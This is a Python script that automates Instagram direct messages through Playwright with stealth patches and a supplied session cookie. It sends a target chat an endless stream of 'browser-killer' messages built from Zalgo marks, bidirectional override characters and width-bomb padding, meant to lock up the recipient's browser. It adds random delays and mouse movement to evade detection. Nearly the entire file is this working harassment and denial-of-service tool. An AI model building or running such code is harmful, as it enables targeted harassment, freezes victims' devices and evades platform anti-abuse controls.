# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (FINAL-FIX-V3)
# 📅 STATUS: NAMESPACE-ISOLATED | 1-ID-STABLE | BROWSER-FREEZE

import os, asyncio, random, sys
from playwright.async_api import async_playwright
# --- THE ULTIMATE FIX: Aliasing the function to avoid module collision ---
from playwright_stealth import stealth as stealth_async

def get_kernel_stop_payload(target_name):
    """Targets Desktop Browser Layout Engines."""
    u_id = random.randint(10000, 99999)
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u200e"], k=15))
    header = f"⚡ 【﻿ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ】 ⚡\n🆔 {u_id}{salt}\n"
    
    # 🏗️ EXTREME DENSITY (120 Zalgo marks per line)
    z_tower = "̸" * 120 
    width_bomb = "\u2800\u00A0" * 45
    lines = [header]
    
    for i in range(85): 
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("0123456789", k=2))
        lines.append(f"{width_bomb}{prefix}𝕻𝕬𝕻𝕬_{noise}{z_tower}")
    
    return "\n".join(lines)[:9980]

async def agent_blitz(machine_id, cookie_list, target_id, target_name):
    current_cookie = cookie_list[0].strip()

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            viewport={'width': 1920, 'height': 1080}
        )
        page = await context.new_page()
        
        # ✅ THE CALL: Using the alias to ensure it calls the function
        await stealth_async(page)
        
        try:
            print(f"📡 [M{machine_id}] Establishing Stealth Connection...")
            await page.goto("https://www.instagram.com/robots.txt")
            await context.add_cookies([{
                "name": "sessionid", "value": current_cookie, 
                "domain": ".instagram.com", "path": "/", "secure": True
            }])

            print(f"📡 [M{machine_id}] Loading Target Chat...")
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            
            box_selector = "//div[@role='textbox']"
            await page.wait_for_selector(box_selector, timeout=60000)

            while True:
                # 🔥 THE STRIKE
                payload = get_kernel_stop_payload(target_name)
                
                await page.click(box_selector)
                await page.fill(box_selector, payload)
                await asyncio.sleep(random.uniform(3, 5)) 
                await page.keyboard.press("Enter")
                
                print(f"💀 [M{machine_id}] Browser-Killer Delivered. Target UI Locked.")

                # ⏳ THE 'SAFETY GAP' (120-150 seconds)
                sleep_time = random.uniform(120, 150)
                print(f"⏳ Cooling down for {int(sleep_time)}s to keep 1-ID safe...")
                
                for _ in range(4):
                    await asyncio.sleep(sleep_time / 4)
                    await page.mouse.move(random.randint(0, 500), random.randint(0, 500))

        except Exception as e:
            print(f"❌ [M{machine_id}] Safety Stop: {str(e)[:60]}")
            await browser.close()
            sys.exit(1)

if __name__ == "__main__":
    m_id = int(os.environ.get("MACHINE_ID", "1"))
    cookies = os.environ.get("SESSION_ID", "").split(",")
    t_id = os.environ.get("GROUP_URL", "").strip()
    t_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    asyncio.run(agent_blitz(m_id, cookies, t_id, t_name))
